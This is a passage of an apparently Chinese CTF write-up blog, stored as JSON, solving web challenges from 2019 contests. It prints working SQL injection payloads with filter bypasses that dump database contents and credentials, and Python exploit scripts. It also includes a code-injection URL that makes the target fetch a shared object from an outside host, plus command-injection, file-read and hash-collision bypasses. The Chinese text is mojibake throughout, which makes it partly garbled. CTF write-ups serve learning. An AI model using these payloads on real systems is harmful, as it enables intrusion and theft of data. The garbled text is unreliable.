·ä½ ä¹Ÿå¯ä»¥åƒé‚£äº›èµ°å¼¯è·¯çš„æ²³æµæœ‰å‹‡æ°”ï¼ŒæŠµè¾¾é‚£é¥è¿œçš„äººç”Ÿå¤§æµ·ã€‚ {% endcolorquote %}\né¢˜ç›®åœ°å€ï¼šhttp://120.79.1.69:8887/web5/\nHacking  \néšä¾¿æäº¤æˆ‘ä»¬å¯ä»¥å‘ç°æœ‰ä¸€ä¸ªé”™è¯¯è¿”å›\nselect id,username,password from `admin` where username=\u0026#39;admin\u0026#39;\u0026lt;br/\u0026gt;ç”¨æˆ·å:adminä¸æ­£ç¡® è¿‡æ»¤äº† or union select ï¼Œä½†æ˜¯å¤§å†™å°±å¯ä»¥ç»•è¿‡ï¼Œç©ºæ ¼è¿‡æ»¤ç”¨%0aç»•è¿‡ï¼Œç”¨username=admin'%0aUNION%0aSELECT%0a1,2,3#ï¼Œå‘ç° 2 é‚£ä¸€åˆ—è¢«å›æ˜¾ï¼Œæ‰€ä»¥å¯ä»¥åœ¨ 2 å¤„æŸ¥è¯¢\n\u0026lt;div class=\u0026#34;tip\u0026#34;\u0026gt; select id,username,password from `admin` where username=\u0026#39;admin\u0026#39; UNION SELECT 1,2,3#\u0026#39;\u0026lt;br/\u0026gt;ç”¨æˆ·å:2æ­£ç¡® \u0026lt;/div\u0026gt; ç”¨username=admin' UNION SELECT 1,group_concat(schema_name),3 from infORmation_schema.schemata#å¾—åˆ°\n\u0026lt;div class=\u0026#34;tip\u0026#34;\u0026gt; select id,username,password from `admin` where username=\u0026#39;admin\u0026#39; UNION SELECT 1,group_concat(schema_name),3 from infORmation_schema.schemata#\u0026#39;\u0026lt;br/\u0026gt;ç”¨æˆ·å:information_schema,xiaoweiæ­£ç¡® \u0026lt;/div\u0026gt; è¡¨åï¼š\n\u0026lt;div class=\u0026#34;tip\u0026#34;\u0026gt; select id,username,password from `admin` where username=\u0026#39;admin\u0026#39; UNION SELECT 1,group_concat(table_name),3 from infORmation_schema.tables where table_schema=\u0026#39;xiaowei\u0026#39;#\u0026#39;\u0026lt;br/\u0026gt;ç”¨æˆ·å:adminæ­£ç¡® \u0026lt;/div\u0026gt; åˆ—åï¼š\n\u0026lt;div class=\u0026#34;tip\u0026#34;\u0026gt; select id,username,password from `admin` where username=\u0026#39;admin\u0026#39; UNION SELECT 1,group_concat(column_name),3 from infORmation_schema.columns where table_name=\u0026#39;admin\u0026#39;#\u0026#39;\u0026lt;br/\u0026gt;ç”¨æˆ·å:id,username,passwordæ­£ç¡® \u0026lt;/div\u0026gt; ç”¨æˆ·åï¼š\n\u0026lt;div class=\u0026#34;tip\u0026#34;\u0026gt; select id,username,password from `admin` where username=\u0026#39;admin\u0026#39; UNION SELECT id,username,3 from admin#\u0026#39;\u0026lt;br/\u0026gt;ç”¨æˆ·å:goodboy_g-60Helloworæ­£ç¡® \u0026lt;/div\u0026gt; å¯†ç ï¼š\n\u0026lt;div class=\u0026#34;tip\u0026#34;\u0026gt; select id,username,password from `admin` where username=\u0026#39;admin\u0026#39; UNION SELECT id,password,3 from admin#\u0026#39;\u0026lt;br/\u0026gt;ç”¨æˆ·å:ajahas\u0026amp;\u0026amp;*44askldajajæ­£ç¡® \u0026lt;/div\u0026gt; ç™»å½•æˆåŠŸåï¼š\n\u0026lt;div\u0026gt;the package password is \u0026lt;span\u0026gt;%^$%\u0026amp;sss88ioiern.gdsgj\u0026lt;/span\u0026gt;\u0026lt;/div\u0026gt;\u0026lt;div\u0026gt;the package download link=\u0026gt;\u0026lt;a href=\u0026#39;sss88ioiern.gdsgj.zip\u0026#39; target=\u0026#39;_blank\u0026#39;\u0026gt;ä»£ç å®¡è®¡.zip\u0026lt;/a\u0026gt;\u0026lt;/div\u0026gt; è‡ªå·±ç”¨çš„è„šæœ¬ï¼š\nindex_url = \u0026#39;http://120.79.1.69:8887/web5/index.php\u0026#39; solution_url = \u0026#39;http://120.79.1.69:8887/web5/?check\u0026#39; headers = { \u0026#39;User-Agent\u0026#39;: \u0026#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36\u0026#39;, \u0026#39;Content-Type\u0026#39;: \u0026#39;application/x-www-form-urlencoded\u0026#39; } proxies = { \u0026#39;http\u0026#39;:\u0026#39;http://127.0.0.1:8080\u0026#39; } r = requests.Session() s = r.get(index_url,allow_redirects=True,headers=headers) str_text = r\u0026#34;\u0026lt;div class=\u0026#39;rep\u0026#39;\u0026gt;.*\u0026lt;/div\u0026gt;\u0026#34; match = re.search(str_text,s.text) result = match.group().replace(\u0026#34;\u0026lt;div class=\u0026#39;rep\u0026#39;\u0026gt;\u0026#34;,\u0026#34;\u0026#34;) result = result.replace(\u0026#34;\u0026lt;/div\u0026gt;\u0026#34;,\u0026#34;\u0026#34;) result = result.replace(\u0026#34;Ã¯Â¼Âˆ\u0026#34;,\u0026#34;(\u0026#34;) result = result.replace(\u0026#34;Ã¯Â¼\u0026#34;,\u0026#34;)\u0026#34;) result = result.replace(\u0026#34;Â‰X\u0026#34;,\u0026#34;*\u0026#34;) result = result.replace(\u0026#34;Â‰/\u0026#34;,\u0026#34;/\u0026#34;) result = result.replace(b\u0026#39;\\xc2\\x89\u0026#39;.decode(),\u0026#34;\u0026#34;) result = str(round(eval(result))) print(result) # param = \u0026#34;username=admin\u0026#39;+||+\u0026#39;1\u0026#39;#\u0026amp;password=admin\u0026amp;code=\u0026#34; + result # param = \u0026#34;username=admin\u0026#39; UNION SELECT 1,group_concat(schema_name),3 from infORmation_schema.schemata#\u0026amp;password=admin\u0026amp;code=\u0026#34; + result # param = \u0026#34;username=admin\u0026#39; UNION SELECT 1,group_concat(table_name),3 from infORmation_schema.tables where table_schema=\u0026#39;xiaowei\u0026#39;#\u0026amp;password=admin\u0026amp;code=\u0026#34; + result # param = \u0026#34;username=admin\u0026#39; UNION SELECT id,group_concat(id),3 from admin#\u0026amp;password=admin\u0026amp;code=\u0026#34; + result param = \u0026#34;username=admin\u0026#39;+||+\u0026#39;1\u0026#39;#\u0026amp;password=ajahas%26%26*44askldajaj\u0026amp;code=\u0026#34; +result param = param.replace(\u0026#39; \u0026#39;,\u0026#34;%0a\u0026#34;) # print(param) s = r.post(solution_url,data=param,headers=headers,proxies=proxies) print(s.text) è¿™é‡Œæ¯”è¾ƒå‘çš„å°±æ˜¯è¦å¤„ç†é‚£äº›ä¸å¯è§å­—ç¬¦ï¼Œæˆ‘éƒ½æ˜¯ç›´æ¥å¤åˆ¶è¿‡æ¥çš„ï¼Œä»¥åŠæœ€åè¿˜æœ‰ä¸ªä¸å¯è§å­—ç¬¦ï¼Œç”¨result = result.replace(b'\\xc2\\x89'.decode(),\u0026quot;\u0026quot;)å¤„ç†äº†\u0026hellip;è¿™é‡Œæ¯”è¾ƒæ¶å¿ƒ\u0026hellip;å…¶ä»–æ²¡ä»€ä¹ˆéš¾åº¦\né‡Œé¢çš„ä»£ç ï¼š\nPrivate Function getPassword(ByVal str As String) As String Dim reString As String Dim i As Integer i = 1 While (i \u0026lt;= Len(str)) reString = reString \u0026amp; Mid(str, i, 1) i = i + (i Mod 5) Wend getPassword = reString End Function Private Sub Command1_Click() Dim Dictionary As String Dictionary = \u0026quot;VmxSS05HSXhXbkpOV0VwT1YwVmFWRll3Wkc5VVJsbDNWMnhhYkZac1NqQlpNRll3VlRBeFNWRnNjRmRpUmtwSVZsY3hSMk14V2xsalJsSnBVakpvV0ZaR1dsWmxSbHBYWWtSYVZtRjZWbGRVVmxwelRrWmFTR1ZHWkZSaGVrWlhWR3hTVjFZeVJuSlhiRUpYWVRGYVYxcFhlRkprTVZaeVkwZHNVMDFWY0ZkV2JURXdWREZSZUZkcmFGVmlhelZvVlcxNFMxWXhjRlpXVkVaUFlrYzVObGt3VmpCWFJrcHpWbXBTVjFadFVqTldiWE4zWkRKT1IySkdaRmRTVm5CUVZtMTBhMVJyTVVkVmJrcFZZa2RTVDFac1VsZFdNVlY0Vld0a1ZVMXNXbGhXTVdodlZsZEtSMU5yWkZWV1JVVXhWV3hhWVZkSFZraGtSbVJUWWtoQ1JsWnJaRFJWTWtaMFUydG9WbUpHV2xoV01HUnZWVVp3V0UxWGNHeFdhelY2V1ZWYVlWUnNXbkpYYm1oWFlrWktVRlY2Um10U01WcFpZVVpXVjJKRmNIaFdSM1JXVFZVd2QyTkdWbFZoTVZwTVZtdFZNVkpuSlRORUpUTkU=\u0026quot; Dim password As String password = getPassword(Dictionary) Dim psw As String psw = Text1.Text If (psw = password) Then MsgBox \u0026quot;The password is correct!\u0026quot;, vbOKOnly, \u0026quot;ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½È·\u0026quot; Text1.Text = \u0026quot;Password for next pass : \u0026quot; \u0026amp; getPassword(password) Else MsgBox \u0026quot;PasswordFail!\u0026quot;, vbOKOnly, \u0026quot;ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½\u0026quot; End If End Sub ç”¨ python ç¿»è¯‘ä¸€ä¸‹\ndef getPassword(string): i = 1 reString = \u0026#39;\u0026#39; while i \u0026lt;= len(string) : reString = reString + string[i-1] i = i + (i % 5) return reString Dictionary = \u0026#34;VmxSS05HSXhXbkpOV0VwT1YwVmFWRll3Wkc5VVJsbDNWMnhhYkZac1NqQlpNRll3VlRBeFNWRnNjRmRpUmtwSVZsY3hSMk14V2xsalJsSnBVakpvV0ZaR1dsWmxSbHBYWWtSYVZtRjZWbGRVVmxwelRrWmFTR1ZHWkZSaGVrWlhWR3hTVjFZeVJuSlhiRUpYWVRGYVYxcFhlRkprTVZaeVkwZHNVMDFWY0ZkV2JURXdWREZSZUZkcmFGVmlhelZvVlcxNFMxWXhjRlpXVkVaUFlrYzVObGt3VmpCWFJrcHpWbXBTVjFadFVqTldiWE4zWkRKT1IySkdaRmRTVm5CUVZtMTBhMVJyTVVkVmJrcFZZa2RTVDFac1VsZFdNVlY0Vld0a1ZVMXNXbGhXTVdodlZsZEtSMU5yWkZWV1JVVXhWV3hhWVZkSFZraGtSbVJUWWtoQ1JsWnJaRFJWTWtaMFUydG9WbUpHV2xoV01HUnZWVVp3V0UxWGNHeFdhelY2V1ZWYVlWUnNXbkpYYm1oWFlrWktVRlY2Um10U01WcFpZVVpXVjJKRmNIaFdSM1JXVFZVd2QyTkdWbFZoTVZwTVZtdFZNVkpuSlRORUpUTkU=\u0026#34; password = getPassword(Dictionary) password = getPassword(password) print(password) å¾—åˆ°å‹ç¼©åŒ…å¯†ç ï¼Œè§£å‹å¾—åˆ°çš„å›¾ç‰‡ç”¨ strings çœ‹ä¸€ä¸‹å°±æ˜¯ flag äº†\nWeb 6 not_easy Description {% colorquote info %} this question is no easy {% endcolorquote %}\né¢˜ç›®åœ°å€ï¼šhttp://120.79.1.69:8886/web6/\nHacking \u0026lt;?php error_reporting(0); if(isset($_GET[\u0026#39;action\u0026#39;])) { $action = $_GET[\u0026#39;action\u0026#39;]; } if(isset($_GET[\u0026#39;action\u0026#39;])){ $arg = $_GET[\u0026#39;arg\u0026#39;]; } if(preg_match(\u0026#39;/^[a-z0-9_]*$/isD\u0026#39;, $action)){ show_source(__FILE__); } else { $action($arg,\u0026#39;\u0026#39;); } Code BreakingåŸé¢˜ï¼Œåªä¸è¿‡æŠŠ arg çš„ä½ç½®æ¢äº†ä¸€ä¸‹ï¼Œæ— ä¼¤å¤§é›…ï¼Œä¾æ—§å¯ä»¥ç”¨){return 123;}è¿™ç§é—­åˆå½¢å¼ç»•è¿‡ã€‚æ¥ä¸‹æ¥å°±æ˜¯çªç ´ disable_function çš„é™åˆ¶äº†ã€‚\n \nè¿™é‡Œæˆ‘ç›´æ¥ç”¨äº† 0ctf çš„è§£æ³•ï¼Œå› ä¸ºæœ‰ç°æˆçš„ exp å°±ç›´æ¥æ‹¿å»ç”¨äº†ã€‚\nhttp://120.79.1.69:8886/web6/?action=\\create_function\u0026amp;arg=){return%202333;}copy(%22http://106.14.153.173:8080/zedd.so%22,%22/www/wwwroot/www.sec.cn/web6/zedd.so%22);%2f%2f  \nåæ¥çœ‹äº†ä¸€ä¸‹å¯ä»¥ç®€ä¾¿ä¸€ç‚¹ï¼Œåœ¨_SERVER[\u0026quot;SCRIPT_FILENAME\u0026quot;]å¤„å‘ç°ç»å¯¹è·¯å¾„ï¼Œç„¶åç”¨ä»¥ä¸‹çœ‹å½“å‰æ–‡ä»¶\nhttp://120.79.1.69:8886/web6/?action=\\create_function\u0026amp;arg=){return%202333;}var_dump(scandir(%22/www/wwwroot/www.sec.cn/web6%22));%2f%2f  \nå¯ä»¥çœ‹åˆ°æˆ‘ä¹‹å‰ä¼ ä¸Šå»çš„.soï¼Œä¹Ÿçœ‹åˆ°äº†è¿˜æœ‰ä¸¤ä¸ª webshell ï¼Œç›´æ¥file_get_contentsè¯» flag å³å¯\nçœ‹çŸ¥ä¹è¿˜æœ‰äººå‘äº†ä¸€å¼€å§‹æ²¡åšé¢˜ç›®éš”ç¦»â€¦è¿˜æ²¡ç”¨ docker \u0026hellip;è¿™ä¸ªä¸€æ‹¿åˆ° shell å°±æ‹¿åˆ°äº†å…¶ä»–é¢˜ç›®äº†\u0026hellip;\nWeb 7 audit Description {% colorquote info %} audit {% endcolorquote %}\né¢˜ç›®åœ°å€ï¼šhttp://120.79.1.69:8887/web7/\nHacking \u0026lt;?php highlight_file(__FILE__); include(\u0026#39;flag.php\u0026#39;); $str1 = @$_GET[\u0026#39;str1\u0026#39;]; $str2 = @$_GET[\u0026#39;str2\u0026#39;]; $str3 = @$_GET[\u0026#39;str3\u0026#39;]; $str4 = @$_GET[\u0026#39;str4\u0026#39;]; $str5 = (string)@$_POST[\u0026#39;str5\u0026#39;]; $str6 = (string)@$_POST[\u0026#39;str6\u0026#39;]; $str7 = (string)@$_POST[\u0026#39;str7\u0026#39;]; if( $str1 == $str2 ){ die(\u0026#39;str1 OR Sstr2 no no no\u0026#39;); } if( md5($str1) != md5($str2) ){ die(\u0026#39;step 1 fail\u0026#39;); } if( $str3 == $str4 ){ die(\u0026#39;str3 OR str4 no no no\u0026#39;); } if ( md5($str3) !== md5($str4)){ die(\u0026#39;step 2 fail\u0026#39;); } if( $str5 == $str6 || $str5 == $str7 || $str6 == $str7 ){ die(\u0026#39;str5 OR str6 OR str7 no no no\u0026#39;); } if (md5($str5) !== md5($str6) || md5($str6) !== md5($str7) || md5($str5) !== md5($str7)){ die(\u0026#39;step 3 fail\u0026#39;); } if(!($_POST[\u0026#39;a\u0026#39;]) and !($_POST[\u0026#39;b\u0026#39;])) { echo \u0026#34;come on!\u0026#34;; die(); } $a = $_POST[\u0026#39;a\u0026#39;]; $b = $_POST[\u0026#39;b\u0026#39;]; $m = $_GET[\u0026#39;m\u0026#39;]; $n = $_GET[\u0026#39;n\u0026#39;]; if (!(ctype_upper($a)) || !(is_numeric($b)) || (strlen($b) \u0026gt; 6)) { echo \u0026#34;a OR b fail!\u0026#34;; die(); } if ((strlen($m) \u0026gt; 4) || (strlen($n) \u0026gt; 4)) { echo \u0026#34;m OR n fail\u0026#34;; die(); } $str8 = hash(\u0026#39;md5\u0026#39;, $a, false); $str9 = strtr(hash(\u0026#39;md5\u0026#39;, $b, false), $m, $n); echo \u0026#34;\u0026lt;p\u0026gt;str8 : $str8\u0026lt;/p\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;p\u0026gt;str9 : $str9\u0026lt;/p\u0026gt;\u0026#34;; if (($str8 == $str9) \u0026amp;\u0026amp; !($a === $b) \u0026amp;\u0026amp; (strlen($b) === 6)) { echo \u0026#34;You\u0026#39;re great,give you flag:\u0026#34;; echo $flag; } str1 OR Sstr2 no no no æºç å®¡è®¡é¢˜ï¼Œç”¨æ•°ç»„å¯ä»¥ç»•è¿‡å‰é¢ 4 ä¸ªåˆ¤æ–­ï¼Œstr5 str6 str7 å› ä¸ºè½¬æˆäº†å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥éœ€è¦å¼ºç¢°æ’ã€‚è¿™é‡Œå¯ä»¥åˆ©ç”¨Three way MD5 collisionç»™çš„ä¸‰ä¸ªå›¾ç‰‡å¼ºè¡Œç¢°æ’ï¼Œä½†æ˜¯æ¯”èµ›çš„æ—¶å€™ç”±äºè‡ªå·±å¯¹ python è¿™å—ä¸æ˜¯ç‰¹åˆ«ç†Ÿï¼Œå¯¼è‡´ä¼ è¿™ä¸‰ä¸ªå€¼è€æ˜¯ä¼ ä¸äº†ï¼Œæœ€åèµ›åé—®äº†ä¸€ä¸‹å…¶ä»–å¸ˆå‚…è¦open().read()è¿™æ ·â€¦ï¼ˆç„¶è€Œè‡ªå·±æŒ‰ç…§é˜¿çƒ¨å¸ˆå‚…çš„æ²¡åŠ read()ä¸€ç›´åšä¸å‡ºæ¥\u0026hellip;\nåé¢çš„å¯ä»¥è‡ªå·± fuzz ä¸€ä¸‹ï¼Œåªè¦æ‰¾åˆ°ä¸€ä¸ª md5 å€¼å¯ä»¥å˜æˆ0exxxxxxå½¢å¼çš„å­—ç¬¦ä¸²å³å¯ã€‚è¿™é‡Œç”¨æ­£åˆ™æ•´äº†å¥½ä¸€ä¼š\nfor ($i=99999; $i \u0026lt; 1000000; $i++) { $str = md5($i); $p = \u0026#39;/^\\w{4}.[0-9]+$/\u0026#39;; if (preg_match($p, $str)) { echo $i.\u0026#34;\t\u0026#34;; echo md5($i); echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } } å¾—åˆ°ä»¥ä¸‹å‡ ä¸ªæ•°\n204540 1a083126803757739236831994920755 541725 2c125284818224703513551749833326 598677 39dd6797642068546678043973187459 å…¶ä»–å°±è¿åˆƒè€Œè§£äº†ã€‚é™„ä¸Šè„šæœ¬\nimport requests url = \u0026#34;http://120.79.1.69:8887/web7/?str1[]=1\u0026amp;str2[]=2\u0026amp;str3[]=3\u0026amp;str4[]=4\u0026amp;m=1a\u0026amp;n=0e\u0026#34; data = { \u0026#39;a\u0026#39;:\u0026#39;QNKCDZO\u0026#39;, \u0026#39;b\u0026#39;:204540, \u0026#39;str5\u0026#39;: open(\u0026#39;black.jpg.coll\u0026#39;).read(), \u0026#39;str6\u0026#39;: open(\u0026#39;brown.jpg.coll\u0026#39;).read(), \u0026#39;str7\u0026#39;: open(\u0026#39;white.jpg.coll\u0026#39;).read() } proxies = { \u0026#39;http\u0026#39;:\u0026#39;http://127.0.0.1:8080\u0026#39; } r = requests.post(url,data = data,proxies=proxies) print r.text Web 8 çœŸçš„æ˜¯ Web Description {% colorquote info %} çœŸçš„æ˜¯webï¼Œæ ¼å¼jactf{} {% endcolorquote %}\né¢˜ç›®åœ°å€ï¼šhttp://120.79.1.69:8887/web8/\nHacking æ˜¯ä¸ª WebAssembly çš„é¢˜ï¼ŒåŸæœ¬ç®—åœ¨ web çš„ï¼Œåé¢æ”¾åˆ° rev å»äº†ï¼Œå°±æ²¡çœ‹äº†ã€‚\nConclusion æ•´ä¸ªæ¯”èµ›è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œå¯ä»¥è¯´æ•´ä¸ªæ¯”èµ›æ²¡æœ‰è‡ªå·±æ¯”èµ›çš„ä¸œè¥¿ï¼Œç®—ä¸ä¸Šæ˜¯é«˜è´¨é‡æ¯”èµ›ï¼Œæ²¡å­¦åˆ°ä»€ä¹ˆå…¶ä»–çš„ä¸œè¥¿ã€‚æŠŠ python åˆæ’¸äº†ä¸€éâ€¦ç®€ç›´ï¼Œpython3 å­—ç¬¦ç¼–ç çœŸçš„æœ‰ç‚¹æ¶å¿ƒâ€¦ web8 å¯èƒ½ä»¥åæœ‰ç©ºå›å›æ¥çœ‹çœ‹ï¼Œå…¶ä»–å°±æ²¡ä»€ä¹ˆäº†ã€‚ä¸è¿‡å¬è¯´æ¯”èµ›ä¸»åŠæ–¹è¿˜æ˜¯åœ¨æ ¡ç”Ÿâ€¦é‚£ä¹Ÿæ˜¯æŒºè¾›è‹¦çš„hhhhâ€¦è¿˜æ˜¯å¯¹ä¸»åŠæ–¹çš„è¾›è‹¦è¿ç»´è¡¨ç¤ºæ„Ÿè°¢\n","date":"2019-04-06T17:38:29Z","permalink":"https://blog.zeddyu.info/2019/04/06/%E6%8E%98%E5%AE%89%E6%9D%AFWeb/","title":"2019æ˜å®‰æ¯Web"},{"content":"å®‰æ’å¼€äº†å‘¨å‘¨ç»ƒè¥¿æ¹–è®ºå‰‘ç‰¹åˆ«ç‰ˆï¼Œé‚£å°±åšä¸€ä¸‹å§\nWeb Web 1 WebScan Description {% colorquote info %} æŸå…¬å¸çš„ç½‘ç«™é­å—åˆ°é»‘å®¢æ”»å‡»ï¼Œå­˜æ”¾åœ¨Apacheé…ç½®æ–‡ä»¶ä¸­çš„é‡è¦ä¿¡æ¯è¢«é»‘å®¢ç›—å–äº†ã€‚å…¬å¸å‘˜å·¥ä¸ºäº†éªŒè¯æˆå› ï¼Œä½¿ç”¨æ˜é‰´Webåº”ç”¨å¼±ç‚¹æ‰«æå™¨æ‰«æç½‘ç«™å¹¶å¯¼å‡ºæ¼æ´æŠ¥å‘Šï¼Œä½ èƒ½é€šè¿‡åˆ†ææ¼æ´æŠ¥å‘Šå¾—å‡ºé»‘å®¢å¯èƒ½æ˜¯é‡‡ç”¨å“ªç§æ¼æ´ç›—å–é‡è¦ä¿¡æ¯çš„ä¹ˆï¼Ÿè¢«ç›—å–çš„é‡è¦ä¿¡æ¯æ˜¯ä»€ä¹ˆï¼Ÿ {% endcolorquote %}\næŠ¥å‘Šåœ°å€ï¼šhttps://xpro-resource.91ctf.com/5c149c800c81e.pdf\né¢˜ç›®åœ°å€ï¼šhttp://101.71.29.5:10009\nHacking é¢˜ç›®ç»™äº†å‡ ä¸ªæ´ï¼Œä¸€ä¸ªç›²æ³¨ï¼Œä¸€ä¸ªç›®å½•ç©¿è¶Šæ–‡ä»¶åŒ…å«\nå°è¯•ç›´æ¥ç”¨ sqlmap çš„ sql_shell è¿›è¡Œæ“ä½œï¼Œå‘ç°secure_file_privä¸ºç©ºï¼Œå°è¯•ç”¨load_file()è¯»æºç ï¼Œå‘ç°è¯»ä¸äº†ï¼Œå†™åˆ°/tmp/ç›®å½•ä¸‹ç”¨æ–‡ä»¶åŒ…å«ä¹Ÿä¸è¡Œï¼Œè¿œç¨‹åŒ…å«ä¸è¡Œï¼Œæœ¬åœ°åŒ…å«å±è”½äº†å…³é”®å­—phpï¼Œå«æœ‰phpçš„å­—ç¬¦ä¸²éƒ½ä¼šè¢« Forbidden ã€‚\nå°è¯•è¯»é…ç½®æ–‡ä»¶view-source:http://101.71.29.5:10009/index.php?act=about\u0026amp;file=/etc/httpd/conf/httpd.confï¼Œç„¶åæŸ¥æ‰¾ log çš„ä½ç½®ï¼Œæƒ³ç”¨æ–‡ä»¶åŒ…å« log æ‹¿ shell\n/var/log/httpd/error_log /var/log/apache2/error.log /var/log/httpd-error.log /var/log/apache/access.log /var/log/apache2/access.log /var/log/httpd/access.log ç„¶è€Œåæ¥æƒ³æƒ³ï¼Œé¢˜ç›®åº”è¯¥æ˜¯ç”¨çš„file_get_content()å‡½æ•°ï¼Œè€Œä¸æ˜¯includeçš„æ“ä½œï¼Œå³ä½¿æœ‰ php ä»£ç ï¼Œä¹Ÿåº”è¯¥æ— æ³•è§£æã€‚\nç„¶åççœ‹é…ç½®æ–‡ä»¶çš„æ—¶å€™ï¼Œå‘ç° flag \u0026hellip;\n \nWeb 2 åˆ€å¡” Description {% colorquote info %} æ— è®ºä½ å–œæ¬¢æ‰“Dotaè¿˜æ˜¯LOLï¼Œéƒ½è¿›ç½‘ç«™é‡Œå­¦ä¹ ä¸€ä¸‹å§ï¼ {% endcolorquote %}\né¢˜ç›®åœ°å€ï¼šhttp://101.71.29.5:10010\nHacking éé¢„æœŸ æ‰«ç›®å½•å¾—åˆ° www.zip ï¼Œæ‰“å¼€åœ¨ flag.php æ‰¾åˆ° flag\næ­£å¸¸è§£ åœ¨ index.php ä¸­å¯ä»¥çœ‹åˆ°\ncase \u0026#39;news\u0026#39;: if(isset($_GET[\u0026#39;nid\u0026#39;])){ if(preg_match(\u0026#34;/[a-zA-Z]/\u0026#34;,$_GET[\u0026#39;nid\u0026#39;])){ exit(\u0026#34;Illegal operation!\u0026#34;); }elseif(strlen($_GET[nid])\u0026gt;5){ exit(\u0026#34;Illegal operation!\u0026#34;); }else{ echo \u0026#34;\u0026lt;p class=lead\u0026gt;\u0026#34;; system(\u0026#34;head ./news/\u0026#34; . $_GET[\u0026#39;nid\u0026#39;]); echo \u0026#34;\u0026lt;/p\u0026gt;\u0026#34;; } }else{ echo \u0026#34;\u0026lt;h3\u0026gt;\u0026lt;a href=index.php?act=news\u0026amp;nid=1\u0026gt;é±¼äººå®ˆå«\u0026lt;/a\u0026gt;\u0026lt;/h3\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;h3\u0026gt;\u0026lt;a href=index.php?act=news\u0026amp;nid=2\u0026gt;é»‘æš—æ¸¸ä¾ \u0026lt;/a\u0026gt;\u0026lt;/h3\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;h3\u0026gt;\u0026lt;a href=index.php?act=news\u0026amp;nid=3\u0026gt;è¡€é­”\u0026lt;/a\u0026gt;\u0026lt;/h3\u0026gt;\u0026#34;; } break; å¯ä»¥çœ‹åˆ°è¿™é‡Œç”¨äº†systemï¼Œæ­£åˆ™åªå…è®¸ç”¨å­—æ¯ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ç”¨é€šé…ç¬¦ç»•è¿‡å°±è¡Œäº†ã€‚ç›´æ¥headä¸Šçº§ç›®å½•act=news\u0026amp;nid=../*\n \nWeb 3 ç¾ç”·å­ Description {% colorquote info %} æˆ‘è¿˜æ˜¯æƒ³å®‰é™çš„åšä¸€ä¸ªç¾ç”·å­ï¼ {% endcolorquote %}\né¢˜ç›®åœ°å€ï¼šhttp://101.71.29.5:10011\nHacking æºä»£ç å¾—åˆ°index.phps\n\u0026lt;?php include \u0026#39;global.php\u0026#39;; function AttackFilter($StrKey,$StrValue,$ArrReq){ if(is_array($StrValue)) { $StrValue=implode($StrValue); } if (preg_match(\u0026#34;/\u0026#34;.$ArrReq.\u0026#34;/is\u0026#34;,$StrtValue)==1){ print \u0026#34;holy shit!\u0026#34;; exit(); } } $filter = \u0026#34;union|select|from|where|join|sleep|benchmark|,|\\(|\\)\u0026#34;; foreach($_POST as $key=\u0026gt;$value){ AttackFilter($key,$value,$filter); } if(!isset($_POST[\u0026#39;key1\u0026#39;]) || !isset($_POST[\u0026#39;key2\u0026#39;])) { print \u0026lt;\u0026lt;\u0026lt;DBAPP\u0026lt;img src=\u0026#39;image/img.jpg\u0026#39; /\u0026gt; \u0026lt;!--index.phps--\u0026gt; DBAPP; die; } $query = mysql_query(\u0026#34;SELECT * FROM tb_ctf WHERE key1 = \u0026#39;{$_POST[\u0026#39;key1\u0026#39;]}\u0026#39;\u0026#34;); if(mysql_num_rows($query) == 1) { $key = mysql_fetch_array($query); if($key[\u0026#39;key2\u0026#39;] == $_POST[\u0026#39;key2\u0026#39;]) { print $flag; }else{ print \u0026#34;Error!\u0026#34;; } }else{ print \u0026#34;Error!\u0026#34;; } çœ‹äº†ä¸€ä¸‹é¢˜ç›®ï¼Œæ³¨å…¥ç‚¹åœ¨ key1 å¤„ï¼Œå¯ä»¥ç”¨å•å¼•å·é—­åˆï¼Œä½†æ˜¯éœ€è¦æŸ¥è¯¢ç»“æœå¾—åˆ°çš„ key2 ä¸ä¼ å…¥çš„ key2 ç›¸ç­‰æ‰èƒ½æ‹¿åˆ° flagã€‚æˆ‘çŒœæµ‹æ˜¯ä¸æ˜¯å¯ä»¥æœ‰ç±»ä¼¼ limit æˆ–è€… union çš„æ“ä½œï¼Œ æ§åˆ¶æŸ¥è¯¢çš„ key2 æˆ‘ä»¬å°±å¯ä»¥ä¼ å…¥æ§åˆ¶ç‚¹äº†\nç„¶åæˆ‘å°±å‘ç°ç«Ÿç„¶æ˜¯ä¸ªåŸé¢˜\u0026hellip;PHDays 2013 CTF â€œBladeâ€ Writeupï¼Œåˆ©ç”¨äº†GROUP BY WITH ROLLUPï¼Œç›¸å…³æ–‡æ¡£ï¼šGROUP BY Modifiers\nå¤§æ¦‚æ•ˆæœå°±æ˜¯ä»¥ä¸‹è¿™ä¸ªæ ·å­ï¼š\nMariaDB[test]\u0026gt;select*fromuserwhereid=1GROUPBYidWITHROLLUPLIMIT1OFFSET1;+------+----------+--------+ |id|username|passwd|+------+----------+--------+ |NULL|admin|admin|+------+----------+--------+ 1rowinset(0.001sec)MariaDB[test]\u0026gt;select*fromuserwhereid=1GROUPBYusernameWITHROLLUPLIMIT1OFFSET1;+----+----------+--------+ |id|username|passwd|+----+----------+--------+ |1|NULL|admin|+----+----------+--------+ 1rowinset(0.000sec)æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬åªéœ€è¦è®© key2 ä¸ºç©ºå°±è¡Œäº†ã€‚\nkey1=' or 1=1 GROUP BY key2 WITH ROLLUP LIMIT 1 OFFSET 1;#\u0026amp;key2=  \nWeb 4 Easy Login Description {% colorquote info %} Easy Login\u0026hellip;So Easy\u0026hellip; {% endcolorquote %}\né¢˜ç›®åœ°å€ï¼šhttp://101.71.29.5:10017\nç„¶è€Œé¢˜ç›®æ²¡å¼€\u0026hellip;\nWeb 5 Be Allowed? Description {% colorquote info %} å°é»‘ç»ˆäºé—¯è¿›äº†å†…ç½‘ï¼Œæ‰¾åˆ°äº†ç›®æ ‡Webä¸»æœºï¼Œä½†æ˜¯å´è¢«åšäº†é™åˆ¶ï¼ {% endcolorquote 